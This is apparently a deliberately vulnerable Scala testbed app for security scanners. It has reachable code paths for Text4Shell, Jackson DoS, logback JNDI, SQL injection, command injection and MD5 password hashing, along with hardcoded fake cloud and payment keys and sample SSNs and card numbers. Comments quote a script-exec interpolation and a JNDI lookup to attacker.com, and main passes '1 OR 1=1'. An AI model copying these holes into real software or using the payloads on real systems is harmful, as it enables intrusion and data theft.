package com.example

import com.fasterxml.jackson.databind.ObjectMapper
import com.fasterxml.jackson.module.scala.DefaultScalaModule
import org.apache.commons.text.StringSubstitutor
import org.slf4j.LoggerFactory

import java.util
import scala.collection.mutable

/**
 * Scala testbed app — REACHABLE testbed
 *
 * CVEs exercised via reachable code paths:
 *   CVE-2022-42003  — jackson-databind deep wrapper DoS (reachable via deserialize())
 *   CVE-2022-42889  — Apache Commons Text4Shell (reachable via processTemplate())
 *   CVE-2021-42550  — logback JNDI injection (reachable via logging)
 *
 * Hardcoded secrets: AWS keys, DB password, Stripe key
 */
object Application {

  private val logger = LoggerFactory.getLogger(getClass)

  // =========================================================================
  // HARDCODED SECRETS (SECRET signal)
  // =========================================================================
  private val AWS_ACCESS_KEY_ID     = "AKIAIOSFODNN7SCALATEST"
  private val AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYSCALAKEY"
  private val STRIPE_API_KEY        = "sk_live_scala_testbed_FakeKeyABCDEFGHIJK"
  private val DATABASE_PASSWORD     = "scala_prod_db_P@ss2026!"
  private val JWT_SECRET            = "scala-jwt-secret-hardcoded-minimum-32-chars!"

  // =========================================================================
  // REACHABLE: jackson-databind CVE-2022-42003 / CVE-2022-42004
  // Deserializing user-controlled JSON with deep nesting — DoS vector
  // =========================================================================
  private val mapper = new ObjectMapper()
    .registerModule(DefaultScalaModule)

  def deserializeUserInput(jsonString: String): Any = {
    // CVE-2022-42003: Jackson <=2.13.0 vulnerable to wrapper array nesting DoS
    // An attacker can send deeply nested JSON arrays to exhaust heap
    mapper.readValue(jsonString, classOf[Any])
  }

  // =========================================================================
  // REACHABLE: Apache Commons Text CVE-2022-42889 (Text4Shell)
  // StringSubstitutor with default lookup resolvers — RCE via script/dns/url lookups
  // =========================================================================
  def processTemplate(template: String, variables: Map[String, String]): String = {
    val javaMap = new util.HashMap[String, String]()
    variables.foreach { case (k, v) => javaMap.put(k, v) }
    // CVE-2022-42889: StringSubstitutor.replace() on user-controlled input
    // Interpolates ${script:javascript:Runtime.getRuntime().exec('cmd')} by default
    StringSubstitutor.replace(template, javaMap)
  }

  // =========================================================================
  // REACHABLE: CWE-089 SQL Injection in Scala
  // =========================================================================
  def getUserById(userId: String): String = {
    // CWE-089: String interpolation into SQL — user-controlled userId
    val query = s"SELECT * FROM users WHERE id = '$userId'"
    logger.info(s"Executing query: $query")
    query // In real app: execute against JDBC
  }

  // =========================================================================
  // REACHABLE: CWE-078 Command Injection in Scala
  // =========================================================================
  def runReport(reportName: String): String = {
    import scala.sys.process._
    // CWE-078: User-controlled reportName passed to shell
    val cmd = s"generate-report.sh $reportName"
    cmd.!!
  }

  // =========================================================================
  // REACHABLE: CWE-327 Weak Cryptography
  // =========================================================================
  def hashPassword(password: String): String = {
    import java.security.MessageDigest
    // CWE-327: MD5 used for password hashing
    val md = MessageDigest.getInstance("MD5")
    md.digest(password.getBytes).map("%02x".format(_)).mkString
  }

  // =========================================================================
  // REACHABLE: DLP/PII — hardcoded personal data
  // =========================================================================
  val sampleUsers: List[Map[String, String]] = List(
    Map(
      "name"  -> "Alice Johnson",
      "email" -> "alice.johnson.personal@gmail.com",
      "ssn"   -> "123-45-6789",
      "phone" -> "415-555-1234",
      "card"  -> "4532015112830366",  // Visa Luhn-valid
    ),
    Map(
      "name"  -> "Bob Williams",
      "email" -> "bob.williams.work@yahoo.com",
      "ssn"   -> "987-65-4321",
      "phone" -> "212-555-9876",
      "card"  -> "5425233430109903",  // Mastercard Luhn-valid
    ),
  )

  // =========================================================================
  // REACHABLE: logback CVE-2021-42550 — JNDI via logger.info with user input
  // Log injection: attacker-controlled content in log message
  // =========================================================================
  def logUserAction(userId: String, action: String): Unit = {
    // CVE-2021-42550: logback <=1.2.3 evaluates JNDI lookups in log messages
    // Attacker sets action = "${jndi:ldap://attacker.com/a}" → RCE
    logger.info(s"User $userId performed action: $action")
  }

  // =========================================================================
  // DEAD CODE: never called from main — NOT_REACHABLE
  // =========================================================================
  private def deadCodeStripeCall(): String = {
    // Never invoked — STRIPE_API_KEY access unreachable
    s"Authorization: Bearer $STRIPE_API_KEY"
  }

  def main(args: Array[String]): Unit = {
    logger.info("Scala testbed starting — CVE/CWE/Secret/DLP test patterns loaded")
    println(s"AWS_KEY configured: ${AWS_ACCESS_KEY_ID.take(8)}...")
    println(s"DB_PASS configured: ${DATABASE_PASSWORD.take(3)}***")

    // Demonstrate reachable calls
    val result = deserializeUserInput("""{"key": "value"}""")
    logger.info(s"Deserialized: $result")

    val sql = getUserById("1 OR 1=1")
    logger.info(s"Query: $sql")
  }
}
